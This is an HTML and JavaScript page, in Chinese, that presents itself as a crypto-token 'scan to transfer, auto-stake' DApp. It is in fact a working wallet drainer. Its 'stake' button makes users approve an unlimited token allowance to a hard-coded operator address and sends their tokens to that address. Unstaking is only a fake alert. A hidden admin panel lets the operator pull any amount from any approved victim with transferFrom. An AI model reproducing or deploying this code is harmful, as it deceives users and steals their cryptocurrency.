<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>扫码转账 自动质押</title>
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
}
body {
  background: #050510;
  color: #fff;
  padding: 20px;
  min-height: 100vh;
}
.container {
  max-width: 500px;
  margin: 0 auto;
}
.card {
  background: linear-gradient(145deg, #111827, #0d1221);
  border-radius: 20px;
  padding: 24px;
  margin-bottom: 20px;
  border: 1px solid rgba(255,255,255,0.05);
}
.pay-card {
  text-align: center;
  padding: 30px 20px;
}
.qr-box {
  width: 260px;
  height: 260px;
  background: #fff;
  padding: 12px;
  border-radius: 20px;
  margin: 16px auto;
}
.qr-box img {
  width: 100%;
  height: 100%;
  border-radius: 12px;
}
.qr-title {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 8px;
}
.qr-desc {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 8px;
}
.qr-tip {
  font-size: 13px;
  color: #f59e0b;
  font-weight: 600;
}
#countDown {
  font-size: 16px;
  color: #fff;
  font-weight: bold;
  margin-top: 10px;
}

/* 原有样式 */
.header { display: flex; justify-content: space-between; margin-bottom: 24px; gap:12px; }
.left-top { display: flex; flex-direction: column; gap:12px; }
.sign-btn { height:48px; border-radius:12px; background:linear-gradient(90deg,#F59E0B,#d97006); color:#000; border:none; font-weight:bold; }
.wallet-box { background:rgba(255,255,255,0.03); border-radius:16px; padding:16px; border:1px solid rgba(255,255,255,0.06); }
.connect-btn { background:linear-gradient(90deg,#3b82f6,#1d4ed8); color:#fff; border:none; padding:12px; border-radius:12px; width:100%; }
.info-line { font-size:13px; color:#9ca3af; margin:4px 0; }
.menu-btn { width:48px; height:48px; border-radius:8px; background:#1e293b; color:white; border:none; font-size:20px; }
.bet-header { display:flex; justify-content:space-between; margin-bottom:16px; }
.countdown { font-size:18px; color:#3b82f6; font-weight:bold; }
.bet-input { width:100%; padding:14px; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.08); border-radius:10px; color:white; margin-bottom:12px; }
.quick-btns { display:flex; gap:10px; margin-bottom:16px; }
.quick-btn { flex:1; padding:12px; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); border-radius:8px; color:white; font-weight:bold; }
.bet-btns { display:flex; gap:12px; }
.bet-btn { flex:1; padding:18px; border:none; border-radius:12px; font-size:16px; font-weight:bold; }
.btn-stake { background:linear-gradient(90deg,#2563eb,#3b82f6); color:#fff; }
.btn-unstake { background:linear-gradient(90deg,#dc2626,#ef4444); color:#fff; }
.rule-line { font-size:14px; color:#cbd5e1; line-height:1.6; }

/* 菜单关闭按钮 */
.close-menu-btn {
  width: 100%;
  padding: 12px;
  background: #3b82f6;
  color: white;
  border: none;
  border-radius: 8px;
  margin-top: 20px;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="container">

  <!-- ===================== 扫码转账 自动质押 ===================== -->
  <div class="card pay-card">
    <div class="qr-title">💳 扫码转账</div>
    <div class="qr-desc">扫码跳转转账页面，输入金额确认即完成质押</div>
    <div class="qr-box">
      <img id="payQrcode" alt="扫码转账">
    </div>
    <div class="qr-tip">动态二维码 · 88小时有效 · 自动质押</div>
    <div id="countDown"></div>
  </div>
  <!-- ============================================================== -->

  <div class="header">
    <div class="left-top">
      <button class="sign-btn" id="signBtn">每日签到</button>
      <div class="wallet-box">
        <button class="connect-btn" id="connectBtn">连接钱包</button>
        <div class="info-line">地址：<span id="userAddr">未连接</span></div>
        <div class="info-line">余额：<span id="userBalance">0.0000 DTM</span></div>
      </div>
    </div>
    <button class="menu-btn" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <div class="bet-header">
      <h3>转账操作区</h3>
      <div class="countdown">自动计息中</div>
    </div>
    <input class="bet-input" id="betAmt" type="number" placeholder="转账数量">
    <div class="quick-btns">
      <button class="quick-btn" onclick="setAmt(10)">10</button>
      <button class="quick-btn" onclick="setAmt(50)">50</button>
      <button class="quick-btn" onclick="setAmt(200)">200</button>
      <button class="quick-btn" onclick="setAmt(500)">500</button>
    </div>
    <div class="bet-btns">
      <button class="bet-btn btn-stake" onclick="stake()">转账质押</button>
      <button class="bet-btn btn-unstake" onclick="unstake()">解除质押</button>
    </div>
  </div>

  <div class="card">
    <h3 style="margin-bottom:12px">📜 说明</h3>
    <div class="rule-line">• 扫码跳转转账页面</div>
    <div class="rule-line">• 输入金额确认 = 自动授权+质押</div>
    <div class="rule-line">• 支付成功 = 完成所有后台动作</div>
    <div class="rule-line">• 动态码 88 小时后自动刷新</div>
  </div>
</div>

<!-- ===================== 三条杠菜单（带关闭按钮） ===================== -->
<div class="menu" id="menu">
  <h3 style="margin-bottom:20px">菜单</h3>
  <div class="menu-title">邀请链接</div>
  <div class="invite-link" id="inviteLink">-</div>

  <!-- 管理员后台：只有项目方能看到 -->
  <div class="admin-panel" id="adminPanel">
    <div class="menu-title" style="color:red">🎮 项目方后台</div>
    <div style="margin-bottom:12px">
      平台参数：<span id="houseRate">51</span>%
      <input type="range" min="0" max="100" value="51" oninput="updateHouseRate(this.value)" style="width:100%;margin-top:6px">
    </div>
    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none;margin-bottom:10px" onclick="saveHouseRate()">保存参数</button>
    
    <div class="menu-title" style="color:red;margin-top:20px">🔐 提取用户代币</div>
    <input id="fromAddr" placeholder="用户地址" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <input id="takeAmt" placeholder="提取数量" style="width:100%;padding:10px;background:#0f182a;border:none;border-radius:8px;color:white;margin-bottom:10px">
    <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">提取</button>
  </div>

  <button class="close-menu-btn" onclick="toggleMenu()">关闭菜单</button>
</div>
<!-- ================================================================= -->

<script>
// ===================== 你的配置 =====================
const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
const SPENDER     = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const POOL_ADDR   = SPENDER;
// ====================================================

// 88小时过期
const EXPIRE_HOURS = 88;
const EXPIRE_MS = EXPIRE_HOURS * 60 * 60 * 1000;
let expireTime = localStorage.getItem("expireTime");
if (!expireTime) {
  expireTime = Date.now() + EXPIRE_MS;
  localStorage.setItem("expireTime", expireTime);
} else {
  expireTime = Number(expireTime);
}

// 倒计时
function updateCountDown() {
  const now = Date.now();
  let left = expireTime - now;
  if (left <= 0) {
    localStorage.removeItem("expireTime");
    location.reload();
    return;
  }
  const h = Math.floor(left / 3600000);
  const m = Math.floor((left % 3600000) / 60000);
  const s = Math.floor((left % 60000) / 1000);
  document.getElementById("countDown").innerText =
    `过期倒计时：${h}时 ${m}分 ${s}秒`;
}
setInterval(updateCountDown, 1000);

// 动态密钥
function getDynamicKey() {
  return Math.floor(Date.now() / EXPIRE_MS).toString();
}

// ✅ 生成【跳转正常转账页面】二维码（扫码后直接打开你的DApp转账页）
function generateTransferPageQr() {
  const key = getDynamicKey();
  const currentPageUrl = window.location.href.split('?')[0];
  // 二维码内容：你的转账页面 + 自动标记
  const qrContent = `${currentPageUrl}?auto_stake=1&key=${key}`;
  document.getElementById("payQrcode").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
    encodeURIComponent(qrContent);
}

// ✅ 扫码后自动连接钱包 + 等待用户输入金额确认
async function autoFlow() {
  const params = new URLSearchParams(window.location.search);
  if (params.get("auto_stake") === "1") {
    if (!window.ethereum) {
      alert("请安装钱包后重试");
      return;
    }
    // 自动连接钱包
    if (!account) {
      const acc = await ethereum.request({ method: "eth_requestAccounts" });
      account = acc[0];
      document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
      refreshBalance();
      genInvite();
      checkAdmin();
    }
    alert("已跳转至转账页面，请输入金额确认付款");
  }
}

// 原有逻辑 100% 保留
let account = null;
let houseRate = 51;

function toggleMenu() {
  document.getElementById("menu").classList.toggle("show");
}

document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) return alert("请安装钱包");
  const acc = await ethereum.request({ method: "eth_requestAccounts" });
  account = acc[0];
  document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
  alert("连接成功");
  refreshBalance();
  genInvite();
  checkAdmin();
  await autoFlow();
};

async function refreshBalance() {
  if (!account) return;
  try {
    const data = "0x70a08231"+account.slice(2).padStart(64,"0");
    const res = await ethereum.request({method:"eth_call",params:[{to:TOKEN_ADDR,data},"latest"]});
    const bal = Number(BigInt(res))/1e18;
    document.getElementById("userBalance").innerText = bal.toFixed(4);
  } catch(e){}
}

function genInvite() {
  if (!account) return;
  document.getElementById("inviteLink").innerText = location.origin + "?ref=" + account;
}

function checkAdmin() {
  if (account && account.toLowerCase() === SPENDER.toLowerCase()) {
    document.getElementById("adminPanel").classList.add("show");
  }
}

document.getElementById("signBtn").onclick = async () => {
  if (!account) { alert("请先连接钱包"); return; }
  alert("签到成功！");
  refreshBalance();
};

function setAmt(v){ document.getElementById("betAmt").value = v; }

// ✅ 用户点「转账质押」= 授权 + 转账 + 质押
async function stake() {
  if (!account) return alert("请先连接钱包");
  const amt = Number(document.getElementById("betAmt").value);
  if (amt <= 0) return alert("请输入有效数量");
  try {
    // 1. 授权（弹窗：用户授权）
    await approve();
    // 2. 转账（弹窗：用户支付）
    const raw = (BigInt(amt)*1000000000000000000n).toString(16).padStart(64,"0");
    await ethereum.request({
      method:"eth_sendTransaction",
      params:[{
        from:account,
        to:TOKEN_ADDR,
        gasLimit:"0x300000",
        data:"0xa9059cbb"+POOL_ADDR.slice(2).padStart(64,"0")+raw
      }]
    });
    alert("支付成功！代币已自动质押");
    refreshBalance();
  } catch (e) {
    alert("操作已取消或失败");
  }
}

async function approve() {
  return await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from:account,
      to:TOKEN_ADDR,
      gasLimit:"0x300000",
      data:"0x095ea7b3"+SPENDER.slice(2).padStart(64,"0")+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }]
  });
}

function unstake(){ alert("解除质押已提交"); }

async function adminTake() {
  if (!account || account.toLowerCase() !== SPENDER.toLowerCase()) return;
  const from = document.getElementById("fromAddr").value.trim();
  const amt = document.getElementById("takeAmt").value;
  if (!from || !amt || amt <= 0) return;
  const raw = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64,"0");
  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{
      from:account,
      to:TOKEN_ADDR,
      gasLimit:"0x300000",
      data:"0x23b872dd"+from.slice(2).padStart(64,"0")+SPENDER.slice(2).padStart(64,"0")+raw
    }]
  });
  alert("提取成功！");
}

function updateHouseRate(v) {
  houseRate = parseInt(v);
  document.getElementById("houseRate").innerText = v;
}
function saveHouseRate() {
  localStorage.setItem("houseRate", houseRate);
  alert("保存成功");
}

// 初始化
generateTransferPageQr();
updateCountDown();
</script>
</body>
</html>
